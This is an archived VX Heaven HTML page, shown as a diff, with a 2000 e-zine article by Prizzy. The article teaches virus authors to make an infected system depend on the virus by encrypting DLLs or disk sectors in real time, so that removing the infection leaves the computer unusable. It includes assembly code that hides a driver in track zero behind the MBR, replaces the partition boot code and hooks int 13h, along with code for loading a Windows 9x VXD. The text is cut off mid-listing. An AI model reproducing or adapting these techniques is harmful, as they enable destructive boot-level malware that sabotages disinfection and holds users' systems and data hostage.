@@ -1,0 +1,754 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Prizzy 'How to make infected system to depend on the virus' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Prizzy"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Prizzy,How to make infected system to depend on the virus, push, callback, service, status, read, driver, files, winnt, device, sector, kernel, ring, virus, offset, stack"/>
+<meta name="Description" content="This article is intended for vx authors who want to equip their viruses the method whereby the infected computer will be dependent on the virus. In this case If an antivirus cleaned all infected files, the computer would be inaccessible. And as we can assume no antivirus won't disinfect files by special method."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"4f38e3ea17635b82d8582c7ba548b8b0f8c9ade8-1498756425-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vpr00.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>How to make infected system to depend on the virus</h1><p><a href="/lib/?lang=en&amp;author=Prizzy"> Prizzy</a><br/> <em><a href="/vx.php?fid=10#f10">29a [5]</a></em><br/> <em>November 2000</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vpr00.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=WI#vpr00">Back to index</a>] [<a href="/lib/vpr00.html#disqus_thread">Comments</a>]<br/> 
+<p><em>This article is intended for vx authors who want to equip their viruses the method whereby the infected computer will be dependent on the virus. In this case If an antivirus cleaned all infected files, the computer would be inaccessible. And as we can assume no antivirus won't disinfect files by special method.</em></p>
+<h2>Index</h2>
+<ul>
+<li><a href="#p1">1. The methods of the system's subjection</a></li>
+<li><a href="#p2">2. Files Encryption</a>
+<ul>
+<li><a href="#p21">2.1. Substandard File Access</a></li>
+</ul></li>
+<li><a href="#p3">3. Disk Encryption</a>
+<ul>
+<li><a href="#p31">3.1. Big Three in Action</a></li>
+<li><a href="#p32">3.2. DOS Driver</a></li>
+<li><a href="#p33">3.3. Win95/98/ME Driver</a>
+<ul>
+<li><a href="#p331">3.3.1. Loading the driver</a></li>
+<li><a href="#p332">3.3.2. What's inside?</a></li>
+<li><a href="#p333">3.3.3. How to load DOS driver</a></li>
+<li>3.3.4. Dynamic Loading</li>
+</ul></li>
+<li><a href="#p34">3.4. WinNT/2k Driver</a>
+<ul>
+<li><a href="#p341">3.4.1. How to compile the driver</a></li>
+<li><a href="#p342">3.4.2. Driver Source</a></li>
+<li><a href="#p343">3.4.3. Disk Operations</a></li>
+<li><a href="#p344">3.4.4. How to load DOS &amp; VXD driver</a></li>
+<li><a href="#p345">3.4.5. Driver loading</a></li>
+</ul></li>
+<li><a href="#p35">3.5. Debugging Drivers</a></li>
+</ul></li>
+<li><a href="#p4">4. Conclusion</a></li>
+</ul>
+<h2><a name="p1"></a>1. The methods of the system's subjection</h2>
+<p>To this day I know only two excelent ways how to reach it. They are based on the real-time encryption of the disk or of the files. Both methods need in order that the virus will be active to decode the encrypted data.</p>
+<h2><a name="p2"></a>2. Files Encryption</h2>
+<p>It doesn't give to the virus full control under the computer. Even this method is somehow limited. Every, for example, opening request from system goes through the virus and it will do:</p>
+<ul>
+<li>encrypt, let's say, of the first 2kb of the file</li>
+<li>on every reading request the virus will decrypt those 2kb of the file</li>
+<li>on the close request the viruss will encrypt back those 2kb</li>
+</ul>
+<p>This method is realized in Win32.Crypto virus.</p>
+<h3><a name="p21"></a>2.1. Substandard file access</h3>
+<p>In Win32 exist two ways how to access to the files, by default through API functions or through drivers (VXD in Win9x and SYS in WinNT/2k). The best way is choose one between them. Imagine in Win9x two programs can open the file both in ring0 and in ring3; and even if you coded VXD driver for ring0 section you wouldn't hook all file accesses, I tested it. Almost one year ago I occur to exploit ring3's LoadLibrary API function and encrypt only DLL files (because ring0 has own VMM function for DLL loading).</p>
+<ul>
+<li>hook LoadLibrary/FreeLibrary API functions in KERNEL32.DLL</li>
+<li>with every FreeLibrary API request encrypt the library</li>
+<li>on LoadLibrary API request decrypt the library</li>
+</ul>
+<p>This method has some code disadvantages:</p>
+<ul>
+<li>In fact, KERNEL32.DLL file is only library and so it demands other infection than EXE files. Your virus also must supports special algorithm for KERNEL32 infection, you can't infect this file when it is opened and when Windows is running you can't write to this file (to know more read one tutorial by LordJulus in VxTaxy e-zine).</li>
+<li>You can't encrypt all DLL files because you must wait than your virus will be active (till then when KERNEL32.DLL won't be loaded). The files cannot be ancrypted are: USER32.DLL, ADVAPI32.DLL, PSTOREC.DLL and many more about 15 static names and the libraries rather from:
+<pre>
+  HKLM\System\CurrentControlSet\Control\SessionManager\KnownDLLs
+  HKLM\System\CurrentControlSet\Control\SessionManager\Known16DLLs
+</pre></li>
+<li>If the user is disinfect himself all files, let's say all DLLs files, after clearing he will be able to get to the OS but not to Windows. He mus re-install all Windows applications, MS-Office, Corel, Acad...</li>
+</ul>
+<h2><a name="p3"></a>3. Disk Encryption</h2>
+<p>It generally means a virus can gradually encrypt some parts of the disk, usually it isn't good encrypt whole disk's data but just only some sections (for example every tenth cluster etc). Thereby we reach of that, the user won't recognize any slowing down of his system. I'd say this way is programly more difficult than files encryption (mainly virus testing). This method can be realize by drivers (for full Win32 system) or with the virus without any drivers (only for WinNT and Win2000 system).</p>
+<h3><a name="p31"></a>3.1. Big Three in Action</h3>
+<p>To monitor all users' operations, at best, there must exist three drivers. The DOS driver, VXD driver and SYS driver.</p>
+<ul>
+<li>If it is Win95/98 virus it must carry DOS driver because the user doesn't need load Windows he can stay in pure DOS.</li>
+<li>The virus for WinNT/2000 and WinME don't need have DOS driver.</li>
+</ul>
+<p>The very interesting situation comes if the user has multi OS, let's say Win9x and WinNT (more datails below).</p>
+<p>How to check whether it's WinME or WinNT?</p>
+<p>The best way is analyze \BOOT.INI file and get Windows' directories, then compare dir structure and decide if it's WinME or WinNT/2k.</p>
+<h3><a name="p32"></a>3.2. DOS Driver</h3>
+<p>I say that again DOS driver must be especially for Win95/98. The best way how to load this driver is from Master Boot Record therewith that driver's body will be store on the zero track. The best is it isn't easy to write something to the MBR from Win9x and WinNT/2k OS, to this theme see in chapters devoted below to these OS.</p>
+<p>How to write driver behind MBR:</p>
+<ul>
+<li>read Partition Table to the own buffer</li>
+<li>check if the driver isn't there yet</li>
+<li>find free space in the zero track (because of EZ-DRIVE etc)
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get disk's information</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">13h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Fh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;sectors per track</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">cx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;read<span style="color: #339933;">:</span><span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">201h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;read one sector</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span>offset buffer<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;1st drive</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">13h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'BA'</span> <span style="color: black; font-style: italic;">;active mark</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> &nbsp; &nbsp; &nbsp;found &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;== the driver is loaded</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">cx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">256</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;search if this sector is</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;free for our dr.'s body</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">scasw</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;is free?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> &nbsp; &nbsp; &nbsp;found<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;next_s<span style="color: #339933;">:</span><span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;go on next sector</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">dx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;end of the track?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; read<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;yes, set the middle of</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;the track</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; found<span style="color: #339933;">:</span><span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>dest_sector<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cl</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;our future sectror number</span><br/>
+&nbsp;</div></li>
+<li>write the driver on the zero track, on the found place</li>
+<li>copy new partition code to the current one, this new code must load our driver to the memory and then run its.
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; new partition code</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;go over signature</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #7f007f;">&quot;AB&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;means the driver is here</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cli</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set the stack frame</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7C00h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sti</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;load the driver to the</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">200h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;memory</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;driver_size<span style="color: #339933;">/</span><span style="color: #ff0000;">512</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;the sector where the driver</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dest_sector <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;is stored</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;1st drive</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">5000h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;new memory location</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;zero offset</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">13h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; seges &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;run on the driver, set</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;0EA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;IP=100h and CS-10h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">100h</span><span style="color: #339933;">+</span>__driver_start<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">5000h</span><span style="color: #339933;">-</span><span style="color: #ff0000;">10h</span><br/>
+&nbsp;</div></li>
+<li>driver 'll immediately restore the old partition code from the buffer, the destination offset is 0:7C00.</li>
+<li>hook 0x13 service and then go back</li>
+</ul>
+<h3><a name="p33"></a>3.3. Win95/98 Driver</h3>
+<p>To hook requests by this OS you must code a VXD driver. Now in this chapter I will show you it won't any problem for you, vxer. At the beginning you should have some programmers needs:</p>
+<ul>
+<li>visit "http://win32asm.cjb.net" and download Iczelion's VXD tutorials; here you'll find information about VXD LE driver structure, its loading, calling VMM functions etc. I expect your knowledge of this tut.</li>
+<li>also without Microsoft Device Development Kit for Win98 "DDK98" it won't go, visit:"http://www.microsoft.com/hwdev/ddk/install98ddk.htm?" and download it. Here you will find all about VXD driver all VMM function descriptions and tips.</li>
+</ul>
+<h4><a name="p331"></a>3.3.1. Loading of the driver</h4>
+<p>There are two types of VXD under Win9x:</p>
+<ul>
+<li>Static VXD</li>
+<li>Dynamic VXD</li>
+</ul>
+<p>The first one are loaded during system bootup and stay loaded until the system shutdown. Dynamic VXD can be loaded/unloaded when needed.</p>
+<p>The best way how to load static VXD is copy its to the SYSTEM\IOSUBSYS directory and after next restart Windows will automatically upload registers itself.</p>
+<p>If you want to load VXD immediately you must call following code:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;no template file</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;FILE_FLAG_DELETE_ON_CLOSE<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span> <span style="color: #ff0000;">0</span> <span style="color: #ff0000;">0</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;offset VxDName &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;the name of the driver</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;CreateFileA<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span><br/>
